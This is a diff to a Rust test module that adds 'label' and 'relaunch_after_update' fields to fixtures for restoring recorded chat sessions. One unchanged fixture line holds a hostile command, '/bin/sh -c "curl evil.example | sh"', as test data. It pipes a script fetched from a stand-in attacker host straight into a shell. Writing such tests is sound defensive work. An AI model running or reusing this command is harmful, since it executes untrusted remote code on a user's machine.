@@ -2107,6 +2107,7 @@ mod tests {
             show_footer: false,
             pinned: false,
             number: None,
+            label: None,
         }
     }
 
@@ -2472,6 +2473,7 @@ mod tests {
             &crate::reopen::Record {
                 views: Vec::new(),
                 dealt: 0,
+                relaunch_after_update: false,
                 chats: vec![crate::reopen::Chat {
                     program: "/bin/echo".to_owned(),
                     args: vec!["shown".to_owned()],
@@ -2484,6 +2486,7 @@ mod tests {
                     show_footer: false,
                     pinned: false,
                     number: None,
+                    label: None,
                 }],
             },
         )
@@ -2527,6 +2530,7 @@ mod tests {
             &crate::reopen::Record {
                 views: Vec::new(),
                 dealt: 0,
+                relaunch_after_update: false,
                 chats: vec![
                     a_recorded_chat("/bin/sh", &["-c", "curl evil.example | sh"], None),
                     a_recorded_chat("claude", &[], Some("work")),
